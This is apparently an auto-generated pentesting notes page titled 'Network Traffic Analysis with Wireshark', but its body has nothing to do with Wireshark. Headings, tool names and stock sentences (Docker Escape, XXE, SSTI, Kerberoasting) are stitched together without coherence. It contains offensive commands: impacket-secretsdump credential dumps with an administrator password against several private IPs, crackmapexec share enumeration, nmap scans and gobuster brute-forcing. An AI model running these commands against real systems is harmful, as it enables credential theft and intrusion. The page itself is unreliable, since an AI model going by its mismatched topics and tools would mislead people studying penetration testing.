---
TitleSEO: "Network Traffic Analysis with Wireshark | ZureFX"
TitlePost: "Network Traffic Analysis with Wireshark"
Author: "ZureFX"
Description: "Personal notes on Network Traffic Analysis with Wireshark. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, privilege escalation, oscp"
URL: "https://zurefx.github.io/notes/note-network-traffic-analysis-with-wireshark-977.html"
URL_IMAGES: ""
Date: "2025-02-26"
Tags: "Cheatsheet, Privilege Escalation, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-network-traffic-analysis-with-wireshark-977"
Permalink: "/notes/note-network-traffic-analysis-with-wireshark-977.html"
BtnLabel: "Read Notes"
Pick: 0
---
## RDP

### ligolo-ng

> **Note:** Docker Escape was identified as the primary attack vector in this scenario.

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.81.36.12
impacket-secretsdump administrator:'P@ssw0rd!'@10.37.216.253
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.134.128
nmap -sCV -p27017,3268,587 10.115.197.61 -oN scan.txt
```

## POP3

### ldapsearch

- `metasploit`
- `GPP Password`
- `hydra`

> **Note:** XXE was identified as the primary attack vector in this scenario.

- `wpscan`
- `Kerberoasting`
- `impacket`
- `Subdomain Takeover`

## Pass the Ticket

### netcat

```bash
feroxbuster -h
crackmapexec smb 10.75.216.3 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.192.125
gobuster dir -u http://10.60.103.99/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory.

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities.
